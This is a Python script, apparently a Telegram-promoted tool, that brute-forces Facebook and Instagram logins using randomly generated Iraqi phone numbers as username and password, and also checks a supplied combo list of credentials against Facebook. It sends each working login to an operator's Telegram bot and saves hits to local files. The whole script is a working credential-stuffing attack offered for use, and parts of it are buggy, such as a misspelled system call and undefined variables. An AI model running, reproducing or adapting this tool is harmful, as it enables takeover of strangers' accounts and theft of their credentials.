#vip2i2
import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')
else:
    try:
        import time
    except:
        os.system('pip install time')
    else:
        os.system('clear')
        try:
            import pyfiglet
        except:
            os.system('pip install pyfiglet')
        else:
            os.system('clear')
            import pyfiglet, os
            from time import sleep
            import webbrowser         
            ss=0
            bb=0
            hh=0
            sr = 0
            bd = 0
            ht = 0
            import random, uuid, requests, string
            from user_agent import generate_user_agent
            from datetime import datetime
            from random import *
            from time import sleep
            import requests, os, random, json, threading, secrets, uuid
            from colorama import Fore, Style
            from time import sleep
            from datetime import datetime
            from secrets import token_hex
            from uuid import uuid4
            from user_agent import generate_user_agent
            from uuid import uuid4
        Z = '\x1b[1;31m'
        X = '\x1b[1;33m'
        Z1 = '\x1b[2;31m'
        F = '\x1b[2;32m'
        A = '\x1b[2;34m'
        C = '\x1b[2;35m'
        B = '\x1b[2;36m'
        K = '\x1b[1;34m'  
        C = "\033[1;97m" #ابيض

       
        
        weaver= """                                                   
        
\033[1;31m--------------------------------
\033[1;33m< \033[2;32mMy telegram channel ids tool WEAVERMAX \033[1;33m>
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @T_F_U
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mGitHub     : @WEAVERMAX
\033[1;31m--------------------------------
 """
        #_________________________________                                     
        r = requests.session()
        print(weaver)
        TOOLS = input("""
\033[1;31m [ \033[2;32m 1 \033[1;31m ] \033[2;36m Hakc‌‌ Facebook 
\033[1;31m [ \033[2;32m 2 \033[1;31m ] \033[2;36m Hakc Facebook Combo list
\033[1;31m [ \033[2;32m 3 \033[1;31m ] \033[2;36m Hakc‌‌ Instgram
\033[2;31m----------------------------------------------
\033[1;31m [ \033[2;32m + \033[1;31m ] \x1b[1;33m Please Choose : \x1b[2;32m""")
        if TOOLS == '1':   
        #_________________________________                                 
            os.system('clear')
            print(weaver)
            tok = input(Z+"["+F+"⌯"+Z+"]"+X+ " Token TeLe"+Z+" :\n"+B)
            ID = input(Z+"["+F+"⌯"+Z+"]"+X+ " ID TeLe"+Z+" :\n"+B)
            os.system('clear')
            print (f''' 
{F}            
  ______             _                 _    
 |  ____|           | |               | |   
 | |__ __ _  ___ ___| |__   ___   ___ | | __
 |  __/ _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
 | | | (_| | (_|  __/ |_) | (_) | (_) |   < 
 |_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\
                                            
                                            
\033[1;31m--------------------------------
\033[1;33m< \033[2;32mMy telegram channel ids tool WEAVERMAX \033[1;33m>
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @T_F_U
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mGitHub     : @WEAVERMAX
\033[1;31m--------------------------------

          \033[1;33m<\033[2;32m WEAVERMAX \033[1;33m> 
             
\033[1;31m--------------------------------          
              ''')
            #_________________________________
            start_msg = requests.post(f"https://api.telegram.org/bot"+str(tok)+"/sendMessage?chat_id="+str(ID)+"&text=start : @vip2i2 ").json()
            id_msg = start_msg['result']['message_id']                    
            while True:
                user = '0123456789'
                us = str(''.join((random.choice(user) for i in range(8))))                
                weavermil = '+96477' + us
                weaverps = '077' + us
                link = 'https://mobile.facebook.com/login.php'
                data = {'email':weavermil,  'pass':weaverps}
                headers = {'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]'}
                shot = requests.post(link, headers=headers, data=data).text
                if 'xc_message' in shot:
                    print(F + ' Email ==> : ' + weavermil + ': pass ==> : ' + weaverps)
                    hh+=1
                    r.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=⌯⌯ 𝙷𝙸 𝙽𝙴𝚆 ＦＢＩ 𝙷𝚊𝙲𝚔 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺  ⌯
. — — — — —  — — — — — . 
⌯ ᴇᴍᴀɪʟ : {username}
⌯ ᴘᴀѕѕ : {password}
. — — — — —  — — — — —
• Tele : @vip2i2  ,  @T_F_U
  ''' )
                elif 'checkpointSubmitButton-actual-button' in shot:
                    print(X + ' Email ==> : ' + weavermil + ': pass ==> : ' + weaverps)
                    ss+=1
                    
                    with open('hit-facbook.txt', 'a') as (weaver):
                        weaver.write('{}:{}\n'.format(username, password))
                else:
                    print(Z + ' Email ==> : ' + weavermil + ': pass ==> : ' + weaverps)
                    bb+=1
                    requests.post(f"https://api.telegram.org/bot"+str(tok)+"/editmessagetext?chat_id="+str(ID)+"&message_id="+str(id_msg)+"&text=\n- 𝙷𝙸 𝙽𝙴𝚆 ＦＢＩ 𝙷𝚊𝙲𝚔 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 \n.— — — — —  — — — — — . \n⌯  𝙷𝚊𝚌𝚔 : "+str(hh)+"\n⌯  𝙱𝙰𝙳 : "+str(bb)+"\n⌯  𝚂𝙴𝙲𝙾𝚁 : "+str(ss)+"\n. — — — — —  — — — — — .\n• Tele : @vip2i2 ,  @T_F_U")
                    
        if TOOLS == '2':  
        
            os.system('clear')
            print (weaver)
            tok = input(Z+"["+F+"⌯"+Z+"]"+X+ " Token TeLe"+Z+" :\n"+B)
            ID = input(Z+"["+F+"⌯"+Z+"]"+X+ " ID TeLe"+Z+" :\n"+B)
            file = input(Z+"["+F+"⌯"+Z+"]"+X+ "Combo list"+Z+" :\n"+B)
            os.system('clear')
            print (f''' 
{F}            
  ______             _                 _    
 |  ____|           | |               | |   
 | |__ __ _  ___ ___| |__   ___   ___ | | __
 |  __/ _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
 | | | (_| | (_|  __/ |_) | (_) | (_) |   < 
 |_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\
                                            
                                            
\033[1;31m--------------------------------
\033[1;33m< \033[2;32mMy telegram channel ids tool hussam \033[1;33m>
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @T_F_U
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mGitHub     : @WEAVERMAX
\033[1;31m--------------------------------

          \033[1;33m<\033[2;32m ＦＢ I\033[1;33m> 
             
\033[1;31m--------------------------------          
              ''')
            
            
            fuck = open(file, 'r')
            #_________________________________
            start_msg = requests.post(f"https://api.telegram.org/bot"+str(tok)+"/sendMessage?chat_id="+str(ID)+"&text=start : @T_F_U").json()
            id_msg = start_msg['result']['message_id']             
            while True:
                user = fuck.readline().split('\n')[0]
                weavermil = user.split(':')[0]
                weaverps = user.split(':')[1]
                link = 'https://mobile.facebook.com/login.php'
                data = {'email':weavermil,  'pass':weaverps}
                headers = {'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]'}
                shot = requests.post(link, headers=headers, data=data).text
                if 'xc_message' in shot:
                    print(F + ' Email ==> : ' + weavermil + ': pass ==> : ' + weaverps)
                    hh+=1
                    r.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=⌯⌯ 𝙷𝙸 𝙽𝙴𝚆 ＦＢＩ 𝙷𝚊𝙲𝚔 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺  ⌯
. — — — — —  — — — — — . 
⌯ ᴇᴍᴀɪʟ : {username}
⌯ ᴘᴀѕѕ : {password}
. — — — — —  — — — — —
• Tele : @vip2i2 ,  @T_F_U
  ''' )
                elif 'checkpointSubmitButton-actual-button' in shot:
                    print(X + ' Email ==> : ' + weavermil + ': pass ==> : ' + weaverps)
                    ss+=1
                    
                    with open('hit-facbook.txt', 'a') as (weaver):
                        weaver.write('{}:{}\n'.format(username, password))
                else:
                    print(Z + ' Email ==> : ' + weavermil + ': pass ==> : ' + weaverps)
                    bb+=1
                    requests.post(f"https://api.telegram.org/bot"+str(tok)+"/editmessagetext?chat_id="+str(ID)+"&message_id="+str(id_msg)+"&text=\n- 𝙷𝙸 𝙽𝙴𝚆 ＦＢＩ 𝙷𝚊𝙲𝚔 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺\n.— — — — —  — — — — — . \n⌯  𝙷𝚊𝚌𝚔 : "+str(hh)+"\n⌯  𝙱𝙰𝙳 : "+str(bb)+"\n⌯  𝚂𝙴𝙲𝙾𝚁 : "+str(ss)+"\n. — — — — —  — — — — — .\n• Tele : @vip2i2 ,  @T_F_U")
                    
                    
if TOOLS == '3':
            os.system('clear')
            print(weaver)
            tok = input(Z+"["+F+"⌯"+Z+"]"+X+ " Token TeLe"+Z+" :\n"+B)
            ID = input(Z+"["+F+"⌯"+Z+"]"+X+ " ID TeLe"+Z+" :\n"+B)
            os.system('clear')
            print (f''' 
{C}
  {C}██{F}╗{C}███{F}╗   {C}██{F}╗{C}███████{F}╗{C}████████{F}╗ {C}█████{F}╗ 
  {C}██{F}║{C}████{F}╗  {C}██{F}║{C}██{F}╔════╝╚══{C}██{F}╔══╝{C}██{F}╔══{C}██{F}╗
  {C}██{F}║{C}██{F}╔{C}██{F}╗ {C}██{F}║{C}███████{F}╗   {C}██{F}║   {C}███████{F}║
  {C}██{F}║{C}██{F}║╚{C}██{F}╗{C}██{F}║╚════{C}██{F}║   {C}██{F}║   {C}██{F}╔══{C}██{F}║
  {C}██{F}║{C}██{F}║ ╚{C}████{F}║{C}███████{F}║   {C}██{F}║   {C}██{F}║  {C}██{F}║
  {F}╚═╝╚═╝  ╚═══╝╚══════╝   ╚╝   
\033[1;31m--------------------------------
\033[1;33m< \033[2;32mMy telegram channel ids tool WEAVERMAX \033[1;33m>
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @T_F_U
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mGitHub    : @WEAVERMAX
\033[1;31m--------------------------------

          \033[1;33m<\033[2;32m WEAVER \033[1;33m> 
             
\033[1;31m--------------------------------          
              ''')
          
            
            start_msg = requests.post(f"https://api.telegram.org/bot"+str(tok)+"/sendMessage?chat_id="+str(ID)+"&text=start : @vip2i2 ").json()
            id_msg = start_msg['result']['message_id']           
            while True:
                user = '0123456789'
                us = str(''.join((random.choice(user) for i in range(8))))                
                username = '+96477' + us
                password = '077' + us
                url = 'https://www.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid,  'password':password,  'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:                  
                    print (F+'user : ' +username+ ' | pass : '+password)
                    ht += 1                    
                    tlg = (f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=⌯ 𝙷𝙸𝙽𝙴𝚆 ＦＢＩ 𝙷𝚊𝙲𝚔 𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 ⌯
. — — — — —  — — — — — . 
⌯ ᴇᴍᴀɪʟ : {username}
⌯ ᴘᴀѕѕ : {password}
. — — — — —  — — — — —
• Tele : @vip2i2 ,  @T_F_U
  ''' )
                    i = requests.post(tlg)
                    with open('insta-hits.txt', 'a') as (HACKED):
                        HACKED.write('{}:{}\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    
                    print (X+'user : ' +username+ ' | pass : '+password)
                    sr+=1
                else:
                    requests.post(f"https://api.telegram.org/bot"+str(tok)+"/editmessagetext?chat_id="+str(ID)+"&message_id="+str(id_msg)+"&text=\n- 𝙷𝙸𝙽𝙴𝚆 ＦＢＩ 𝙷𝚊𝙲𝚔 𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 \n.— — — — —  — — — — — . \n⌯  𝙷𝚊𝚌𝚔 : "+str(ht)+"\n⌯  𝙱𝙰𝙳 : "+str(bd)+"\n⌯  𝚂𝙴𝙲𝙾𝚁 : "+str(sr)+"\n. — — — — —  — — — — — .\n• Tele : @vip2i2  ,  @T_F_U")
                    print (Z+'user : ' +username+ ' | pass : '+password)
                    bd+=1                          
                                                    
                      

        
